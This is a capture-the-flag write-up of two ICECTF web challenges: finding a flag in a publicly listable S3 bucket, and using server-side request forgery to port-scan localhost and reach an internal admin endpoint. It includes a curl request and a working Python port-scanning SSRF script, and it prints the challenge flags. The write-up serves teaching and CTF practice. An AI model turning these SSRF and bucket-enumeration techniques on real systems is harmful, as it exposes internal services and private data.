Shoutout to all ICECTF players & the community!

# Cyber Meme<a name="cyber-meme"></a>
1. In this challenge you will get a website that full of cybersecurity related meme.

2. Looking at the image and source code, you cannot see anything suspicious except some line of code for toggle the theme. Upon closer look, you can see that the all the meme image have the same source which is ```https://meme-icectf-bucket.s3.ap-southeast-1.amazonaws.com/icectf-meme/<meme-name>```

3. By doing some research or chatgpt, we know that it is an S3 bucket link.

> [!NOTE]
> An S3 bucket is a storage container in Amazon S3 (Simple Storage Service) where you can store files (called objects) like images, videos, documents, backups, etc.

4. Some common vulnerabilities or misconfigurations that associated with this public S3 bucket structure is when the **S3 bucket is misconfigured to allow public listing**. Anyone in the internet can list all files anywhere and anytime. To test it, we can try visiting the bucket root URL as it might show a list of all the files. The bucket root URL is ```https://meme-icectf-bucket.s3.ap-southeast-1.amazonaws.com/```.

5. We can see the list of all files in the bucket. Now we know that the user misconfigured to allow list all the files. What we need to do is to view all the files to see whether theres any files that maybe **sensitive** or different from our cyber meme web.

6. We see that theres one files that are different from other as it is **.txt** files while others is **.png** files. Then we can try to access the files to see whether there is anything that pique our interest(password, api key, or flag in this case). 

![image](https://github.com/user-attachments/assets/f1e66849-252d-4874-b571-405e29240ca9)

7. Boom, theres our flag at the bottom of the file!
```Flag : ICECTF{g3t_0ut_0f_my_buck3t_a6b7ssj}```
> [!TIP]
> Reconnaissance might feel boring or "leceh" but in real pentesting or bug bounty work, it is where the gold often lies. Recon is the stage where we gather information, understand the system and look for anything that stands out. In this case, sometimes sensitive informations are leaked when some cloud misconfigurations happen. It was a small "meme.txt" detail that led to discovering a big flag hehe.
> **Good recon = good results**. The best hackers are the most observant.


# SEO Scanner Pro<a name="seo-scanner"></a>
Description :
Our SEO team uses a fancy in-house tool called SEO Scanner Proâ„¢ to analyze websites by fetching their metadata â€” like title tags, keywords, etc.
Itâ€™s clean. Itâ€™s shiny. Itâ€™s safe... right?

Hint 1 : Our junior devs said we also have in house admin dashboard<br>
Hint 2 : So in house means in the same server right?

1. In this challenge we see a website that have only one button which is scan my website.

  ![image](https://github.com/user-attachments/assets/0eacc368-255a-4b13-bb4e-08f2cc326e71)

2. Lets try to click the button and check the network tab in developer tools

3. Looking at the request header, request payload and response we can deduce that this website send a request to the url given and the response will return the title of the web and html of it. 
4. Well, as the url for the scanned website in the payload, maybe we can change it to scan any other website? Let's use curl to scan a website that are not valid. Let see the response. This is the curl payload :
  ```curl -k -X POST https://seoscanner.syamilyusof.com/api/scan   -H "Authorization: Bearer seoscannerprotoken"   -H "Content-Type: application/json" -d '{"site": "<<url>>"}'```
  Don't forget to send the **Authorization token** or else you will get error unauthorized.

5. We get a response of unable to scan site. Now one thing that we know is that if the site is available, we get some repsonse of title and html of the web and if it is not available we get "unable to scan site" response. Based on the hint given, we know that there is **admin** site somewhere in the same server as our seo scanner website. But we cannot access it. Now, by doing some research, we can expect that this may be a **Server-Side Request Forgery** vulnerability

   > [!NOTE]
   > SSRF is a web vulnerability where the server is tricked into making a request to another server, internal api or internal dashboard on behalf of the attacker.

6. Now the first thing we need to understand is that we may be able to scan the localhost. To do it we need to test by searching for port number that our Seo Scanner Pro web is running on. We can do some scripting to brute force each port, and the port that return some response with title is the port that are currently running. For demonstration purpose, im gonna scan port 3000 to 3005 only.
  
    ```python
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    target_url = "https://seoscanner.syamilyusof.com/api/scan"
    host = "127.0.0.1"  # SSRF target
    
    headers = {
        "Authorization": "Bearer seoscannerprotoken",
        "Content-Type": "application/json",
    }
    
    for port in range(3000, 3005):
        payload = {
            "site": f"http://{host}:{port}"
        }
    
        try:
            response = requests.post(
                target_url,
                headers=headers,
                json=payload,
                timeout=3,
                verify=False
            )
            data = response.json()
    
            if "result" in data and "SEO Scan Complete" in data["result"]:
                print(f"[+] Port {port} OPEN â†’ {payload['site']}")
            elif "error" in data:
                print(f"[!] Port {port} blocked or closed â†’ {data['error']}")
            else:
                print(f"[-] Port {port} unknown response â†’ {data}")
        except requests.exceptions.RequestException as e:
            print(f"[x] Port {port} request error â†’ {e}")
    ```

7. Wew, we got some response. We can see that port 3003 is open eventhough we are not sure yet what will it response. Now using our curl + localhost port that we found. We try to see the response.

   ![image](https://github.com/user-attachments/assets/ebcc9adf-04c5-45a9-96ed-a9c120d0e1ec)

8. And boom, what we see now is the SEO Scanner website that hosted at port 3003. Now remember our hint? In-house admin site? It means that the admin site is in the same server with our SEO Scanner website but probably in another port. Now by adding our port scanning range, we may able to find something interesting. Lets go!

   ```python
   # change this line in our original code to port 5000
   # for port in range(3000, 3005):
   for port in range(3000, 5000):
   ```

10. Guest what? We found something in port 4889. Let's try to curl it, hopefully it will show some admin dashboard hiuhiu.

  ![image](https://github.com/user-attachments/assets/decb01f8-36e8-445a-b4f1-bbd7c93c4048)

10. And boom! We are in. Admin dashboard that we should be able to access from local only now we are able to see it from our terminal. Let's see anything that we can see anything from the response. Pasting it in some text editor will make it more pretty hehe.

    ![image](https://github.com/user-attachments/assets/9cf30343-eb16-4002-bfec-a2d30571b95a)

11. We see some interesting thing which is :
    ```html
    <li>
        Flag Endpoint: <code>/internal/flag</code>
    </li>
    ```
12. Letsss curlll!!!!!

    ![image](https://github.com/user-attachments/assets/b05211fc-eda3-4870-bae8-ca9e90647ab8)

13. And boom thats the flag! ```Flag: ICECTF{ssrf_scan_ftw_89866b}```
